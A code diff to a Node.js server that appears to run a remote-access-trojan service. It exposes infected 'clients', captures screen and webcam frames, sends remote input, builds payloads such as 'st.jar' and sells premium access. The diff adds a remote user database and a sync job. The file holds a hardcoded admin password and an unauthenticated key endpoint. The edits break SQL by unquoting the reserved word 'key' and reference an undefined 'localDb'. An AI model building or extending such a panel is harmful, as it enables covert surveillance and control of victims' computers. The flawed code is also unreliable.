@@ -12,7 +12,9 @@ import http from 'node:http';
 import https from 'node:https';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
-import db, { initDb, UPLOAD_DIR } from './db.js';
+
+import { remoteDb, initRemoteDb } from './remote_db.js';
+import { db, initLocalDb, UPLOAD_DIR } from './local_db.js';
 import { startUdp, closeUdp, sendInput, sendCfg, getFrame, getWebcamFrame, getMonitors, getCursor, getPing } from './net.js';
 import { handleRpc } from './tcp_rpc.js';
 import { buildBoot } from './builder/rustbuild.js';
@@ -297,7 +299,7 @@ app.get('/api/health', (_req, res) => {
 
 app.get('/api/getkey/:buildId', async (req, res) => {
   const buildId = Number(req.params.buildId);
-  const [rows] = await db.query(`SELECT \`key\` FROM builds WHERE id = ?`, [buildId]);
+  const [rows] = await db.query(`SELECT key FROM builds WHERE id = ?`, [buildId]);
   if (!rows.length) return res.status(404).send('{"error": "not found"}');
   res.send(`{"key": "${rows[0].key}"}`);
 });
@@ -315,7 +317,7 @@ app.post('/api/signup', limitAuth, async (req, res) => {
   if (!isDiscordWebhook(discordWebhook))
     return res.status(400).json({ error: 'invalid discord webhook url' });
 
-  const [exists] = await db.query(`SELECT id FROM users WHERE username = ? OR email = ?`, [username, email]);
+  const [exists] = await remoteDb.query(`SELECT id FROM users WHERE username = ? OR email = ?`, [username, email]);
   if (exists.length) return res.status(409).json({ error: 'username or email taken' });
 
   const webhookOk = await sendWebhook(discordWebhook, {
@@ -329,21 +331,24 @@ app.post('/api/signup', limitAuth, async (req, res) => {
   const hash       = await bcrypt.hash(password, 12);
   const accountKey = genKey();
   const loginToken = genLoginTok();
+  const now        = Date.now();
 
-  const [info] = await db.query(`
+  const [info] = await remoteDb.query(`
     INSERT INTO users (username, email, password_hash, account_key, login_token, discord_webhook, created_at)
     VALUES (?, ?, ?, ?, ?, ?, ?)
-  `, [username, email, hash, accountKey, loginToken, discordWebhook, Date.now()]);
+  `, [username, email, hash, accountKey, loginToken, discordWebhook, now]);
+
+  const uid = Number(info.insertId);
+  
+  // Also insert locally
+  await db.query(`
+    INSERT INTO users (id, username, email, password_hash, account_key, login_token, discord_webhook, created_at)
+    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+  `, [uid, username, email, hash, accountKey, loginToken, discordWebhook, now]);
 
   const user = { 
-    id: Number(info.insertId), 
-    username, 
-    email, 
-    account_key: accountKey, 
-    login_token: loginToken, 
-    discord_webhook: discordWebhook, 
-    created_at: Date.now(), 
-    premium_until: 0 
+    id: uid, username, email, account_key: accountKey, login_token: loginToken, 
+    discord_webhook: discordWebhook, created_at: now, premium_until: 0 
   };
   
   userCacheById.set(user.id, user);
@@ -371,17 +376,17 @@ app.post('/api/signin', limitAuth, async (req, res) => {
   let user = null;
 
   if (loginToken && !password) {
-    const [rows] = await db.query(`SELECT * FROM users WHERE login_token = ?`, [loginToken]);
+    const [rows] = await remoteDb.query(`SELECT * FROM users WHERE login_token = ?`, [loginToken]);
     user = rows[0];
   } else if (loginToken && password) {
-    const [rows] = await db.query(`SELECT * FROM users WHERE login_token = ?`, [loginToken]);
+    const [rows] = await remoteDb.query(`SELECT * FROM users WHERE login_token = ?`, [loginToken]);
     user = rows[0];
     if (user) {
       const ok = await bcrypt.compare(password, user.password_hash);
       if (!ok) user = null;
     }
   } else if (username && password) {
-    const [rows] = await db.query(`SELECT * FROM users WHERE username = ? OR email = ?`, [username, username]);
+    const [rows] = await remoteDb.query(`SELECT * FROM users WHERE username = ? OR email = ?`, [username, username]);
     user = rows[0];
     if (user) {
       const ok = await bcrypt.compare(password, user.password_hash);
@@ -426,6 +431,7 @@ app.post('/api/webhook/test', requireAuth, limitWebhook, async (req, res) => {
   });
   if (!ok) return res.status(502).json({ error: 'webhook unreachable' });
   
+  await remoteDb.query(`UPDATE users SET discord_webhook = ? WHERE id = ?`, [url, req.user.uid]);
   await db.query(`UPDATE users SET discord_webhook = ? WHERE id = ?`, [url, req.user.uid]);
   invalidateUser(req.user.uid);
   res.json({ ok: true });
@@ -483,7 +489,7 @@ app.get('/api/clients', requireAuth, async (req, res) => {
     })),
   };
 
-  setCache(cacheKey, payload, 5000); // Cache for 5 seconds
+  setCache(cacheKey, payload, 5000);
   res.json(payload);
 });
 
@@ -893,7 +899,7 @@ app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
   }
 
   const [info] = await db.query(`
-    INSERT INTO builds (user_id, name, stored_name, size, base, \`key\`, config, created_at)
+    INSERT INTO builds (user_id, name, stored_name, size, base, key, config, created_at)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?)
   `, [req.user.uid, outName, outName, zipBuf.length, 'boot', buildKey, '{}', Date.now()]);
 
@@ -912,7 +918,7 @@ app.post('/api/build', requireAuth, limitBuild, async (req, res) => {
 
 app.get('/api/builds', requireAuth, async (req, res) => {
   const [rows] = await db.query(`
-    SELECT id, name, size, base, \`key\`, created_at FROM builds
+    SELECT id, name, size, base, key, created_at FROM builds
     WHERE user_id = ? ORDER BY created_at DESC LIMIT 100
   `, [req.user.uid]);
   res.json(rows);
@@ -958,13 +964,14 @@ app.post('/api/admin/upgrade', limitAdmin, async (req, res) => {
   if (!accountKey) return res.status(400).json({ error: 'Account key required' });
   if (!days || isNaN(days)) return res.status(400).json({ error: 'Valid days required' });
 
-  const [users] = await db.query(`SELECT id, premium_until FROM users WHERE account_key = ?`, [accountKey]);
+  const [users] = await remoteDb.query(`SELECT id, premium_until FROM users WHERE account_key = ?`, [accountKey]);
   if (!users.length) return res.status(404).json({ error: 'User not found' });
   const user = users[0];
 
   const baseTime = (user.premium_until && Number(user.premium_until) > Date.now()) ? Number(user.premium_until) : Date.now();
   const newExpiry = baseTime + (Number(days) * 24 * 60 * 60 * 1000);
 
+  await remoteDb.query(`UPDATE users SET premium_until = ? WHERE id = ?`, [newExpiry, user.id]);
   await db.query(`UPDATE users SET premium_until = ? WHERE id = ?`, [newExpiry, user.id]);
   invalidateUser(user.id);
 
@@ -978,9 +985,10 @@ app.post('/api/admin/remove', limitAdmin, async (req, res) => {
   if (password !== 'Shit123') return res.status(403).json({ error: 'Forbidden' });
   if (!accountKey) return res.status(400).json({ error: 'Account key required' });
 
-  const [users] = await db.query(`SELECT id FROM users WHERE account_key = ?`, [accountKey]);
+  const [users] = await remoteDb.query(`SELECT id FROM users WHERE account_key = ?`, [accountKey]);
   if (!users.length) return res.status(404).json({ error: 'User not found' });
 
+  await remoteDb.query(`UPDATE users SET premium_until = 0 WHERE id = ?`, [users[0].id]);
   await db.query(`UPDATE users SET premium_until = 0 WHERE id = ?`, [users[0].id]);
   invalidateUser(users[0].id);
   res.json({ ok: true, message: 'Premium removed successfully' });
@@ -1080,13 +1088,53 @@ app.get('/api/admin2/stats', limitAdmin2Api, requireAdmin2, async (req, res) => 
     })),
   };
 
-  setCache(cacheKey, payload, 10000); // 10s cache for global stats
+  setCache(cacheKey, payload, 10000);
   res.json(payload);
 });
 
 app.use('/api', (_req, res) => res.status(404).json({ error: 'not found' }));
 app.use((err, _req, res, _next) => { console.error('[http]', err); res.status(500).json({ error: 'server error' }); });
 
+// ─── Sync Job ────────────────────────────────────────────────────────────────
+async function syncUsers() {
+  try {
+    const [remoteUsers] = await remoteDb.query('SELECT * FROM users');
+    const localUsers = localDb.prepare('SELECT * FROM users').all();
+    
+    const remoteMap = new Map(remoteUsers.map(u => [u.id, u]));
+    const localMap = new Map(localUsers.map(u => [u.id, u]));
+
+    // 1. Push missing local users to remote
+    for (const u of localUsers) {
+      if (!remoteMap.has(u.id)) {
+        await remoteDb.query(`
+          INSERT INTO users (id, username, email, password_hash, account_key, login_token, discord_webhook, created_at, premium_until)
+          VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+        `, [u.id, u.username, u.email, u.password_hash, u.account_key, u.login_token, u.discord_webhook, u.created_at, u.premium_until]);
+      }
+    }
+
+    // 2. Pull missing users and update premium
+    for (const u of remoteUsers) {
+      const local = localMap.get(u.id);
+      if (!local) {
+        localDb.prepare(`
+          INSERT INTO users (id, username, email, password_hash, account_key, login_token, discord_webhook, created_at, premium_until)
+          VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+        `).run(u.id, u.username, u.email, u.password_hash, u.account_key, u.login_token, u.discord_webhook, u.created_at, u.premium_until);
+      } else if (local.premium_until !== u.premium_until || local.discord_webhook !== u.discord_webhook) {
+        localDb.prepare('UPDATE users SET premium_until = ?, discord_webhook = ? WHERE id = ?').run(u.premium_until, u.discord_webhook, u.id);
+      }
+    }
+  } catch (e) {
+    console.error('[sync] failed:', e.message);
+  }
+}
+
+setInterval(syncUsers, 10 * 60 * 1000); // Sync every 10 mins
+setTimeout(syncUsers, 5000); // Initial sync
+
+// ─── Build Auto-Refresh ──────────────────────────────────────────────────────
 const AUTO_REFRESH_INTERVAL_MS = 6 * 60 * 60 * 1000;
 
 async function refreshAllBuilds() {
@@ -1107,7 +1155,7 @@ async function refreshAllBuilds() {
         if (!u || !u.account_key) continue;
 
         const [latestRows] = await db.query(`
-          SELECT id, \`key\` FROM builds WHERE user_id = ? AND base = 'boot' ORDER BY created_at DESC LIMIT 1
+          SELECT id, key FROM builds WHERE user_id = ? AND base = 'boot' ORDER BY created_at DESC LIMIT 1
         `, [uid]);
         const latest = latestRows[0];
         if (!latest) continue;
@@ -1168,9 +1216,11 @@ const tlsHttpServer = https.createServer(tlsOpts, app);
 
 (async () => {
   try {
-    console.log('[startup] Initializing Database...');
-    await initDb();
-    console.log('[startup] Database ready.');
+    console.log('[startup] Initializing Remote Database...');
+    await initRemoteDb();
+    console.log('[startup] Initializing Local Database...');
+    await initLocalDb();
+    console.log('[startup] Databases ready.');
     
     console.log('[startup] Building st.jar payload...');
     await buildJavaPayload();
